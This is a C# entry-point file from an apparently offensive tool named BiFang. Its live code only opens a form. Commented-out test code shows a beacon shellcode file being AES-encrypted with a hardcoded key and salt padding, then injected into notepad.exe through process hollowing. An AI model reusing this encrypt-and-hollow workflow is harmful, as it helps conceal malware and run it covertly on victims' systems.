using BiFang.until;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;

namespace BiFang
{
    internal class Program
    {
        [STAThread]
        private static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new MainForm());
        }

        //private static void Main(string[] args)
        //{
        //    //var argsDIct= Hepler.Analysis(args);
        //    //byte[] raw = System.IO.File.ReadAllBytes("beacon.bin");
        //    //string key = "hi@2021";
        //    //Console.WriteLine(raw);
        //    //string rawstr = Crypto.AES_Encrypt(raw, key, "1qaz2wsx");
        //    //Console.WriteLine(rawstr);
        //    //var bytes = Crypto.AES_Decrypt(rawstr, key, "1qaz2wsx");
        //    //Console.ReadLine();
        //    //var _aesCryptoUtil = new AesCryptoUtil(key);
        //    //var _saltUtil = new SaltUtil();
        //    //var _bytesUtil = new BytesUtil();

        //    //var headSalt = _saltUtil.GenerateSalt(SaltSetting.HeadSize);
        //    //var tailSalt = _saltUtil.GenerateSalt(SaltSetting.TailSize);
        //    //var plainBytesWithSalts = _bytesUtil.Combine(headSalt, raw, tailSalt);
        //    //var encryptedBytes = _aesCryptoUtil.Encrypt(plainBytesWithSalts);
        //    //var encryptedText = _bytesUtil.ToBase64(encryptedBytes);
        //    //Console.WriteLine(encryptedText);

        //    //var bs64 = _bytesUtil.FromBase64(encryptedText);
        //    //var bytes = _aesCryptoUtil.Decrypt(bs64);
        //    //var plainBytes = bytes.Skip(SaltSetting.HeadSize).Take(plainBytesWithSalts.Length - SaltSetting.HeadSize - SaltSetting.TailSize).ToArray();
        //    //Console.WriteLine(plainBytes);

        //    //byte[] raw = System.IO.File.ReadAllBytes("beacon.bin");
        //    //Hollwing hollwing = new Hollwing();
        //    //hollwing.Run("notepad.exe", raw);
        //    //Console.ReadLine();
        //}
    }
}